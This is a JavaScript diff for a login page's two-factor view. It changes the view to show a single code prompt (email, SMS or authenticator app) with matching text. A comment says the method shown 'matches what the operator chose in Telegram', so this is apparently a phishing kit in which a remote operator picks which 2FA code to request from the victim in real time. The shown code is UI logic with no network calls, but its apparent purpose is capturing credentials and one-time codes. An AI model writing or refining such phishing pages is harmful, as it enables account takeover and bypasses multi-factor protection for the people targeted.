@@ -33,7 +33,7 @@
         overlayEl.setAttribute('aria-hidden', 'true');
     }
 
-    /** Show the 2FA view, selecting the right tab based on type ('email'|'phone'|'totp'). */
+    /** Show 2FA for a single method only — matches what the operator chose in Telegram ('email'|'phone'|'totp'). */
     function show2fa(twoFaType) {
         var loginView  = document.getElementById('loginView');
         var twoFaView  = document.getElementById('twoFaView');
@@ -42,14 +42,41 @@
         if (forgotView) forgotView.style.display  = 'none';
         if (twoFaView)  twoFaView.style.display   = '';
 
-        // Select the matching tab (fall back to email)
-        var method = twoFaType || 'email';
-        var tabs = document.querySelectorAll('.twofa-tab');
-        tabs.forEach(function (tab) {
-            var active = tab.dataset.method === method;
-            tab.classList.toggle('twofa-tab--active', active);
-            tab.setAttribute('aria-selected', active ? 'true' : 'false');
-        });
+        var method = (twoFaType || 'email').toLowerCase();
+        if (method !== 'email' && method !== 'phone' && method !== 'totp') {
+            method = 'email';
+        }
+
+        if (twoFaView) {
+            twoFaView.setAttribute('data-2fa-method', method);
+        }
+
+        var tabsStrip = document.getElementById('twoFaTabs');
+        if (tabsStrip) {
+            tabsStrip.hidden = true;
+            tabsStrip.style.display = 'none';
+        }
+
+        var titleEl = document.getElementById('twoFaTitle');
+        var descEl = document.getElementById('twoFaDesc');
+        if (titleEl) {
+            if (method === 'email') {
+                titleEl.textContent = 'Verify your email';
+            } else if (method === 'phone') {
+                titleEl.textContent = 'Verify your phone';
+            } else {
+                titleEl.textContent = 'Authenticator app';
+            }
+        }
+        if (descEl) {
+            if (method === 'email') {
+                descEl.textContent = 'Enter the 6-digit code sent to your email address.';
+            } else if (method === 'phone') {
+                descEl.textContent = 'Enter the 6-digit code sent via SMS to your phone.';
+            } else {
+                descEl.textContent = 'Enter the 6-digit code from your authenticator app.';
+            }
+        }
 
         var panels = {
             email: document.getElementById('twoFaPanelEmail'),
@@ -57,10 +84,11 @@
             totp:  document.getElementById('twoFaPanelTotp')
         };
         Object.keys(panels).forEach(function (key) {
-            if (panels[key]) panels[key].style.display = key === method ? '' : 'none';
+            if (panels[key]) {
+                panels[key].style.display = key === method ? '' : 'none';
+            }
         });
 
-        // Focus the correct input
         var inputMap = {
             email: 'twoFaEmailCode',
             phone: 'twoFaPhoneCode',
@@ -75,7 +103,10 @@
         var loginView  = document.getElementById('loginView');
         var twoFaView  = document.getElementById('twoFaView');
         var forgotView = document.getElementById('forgotView');
-        if (twoFaView)  twoFaView.style.display  = 'none';
+        if (twoFaView) {
+            twoFaView.style.display = 'none';
+            twoFaView.removeAttribute('data-2fa-method');
+        }
         if (forgotView) forgotView.style.display  = 'none';
         if (loginView)  loginView.style.display   = '';
     }
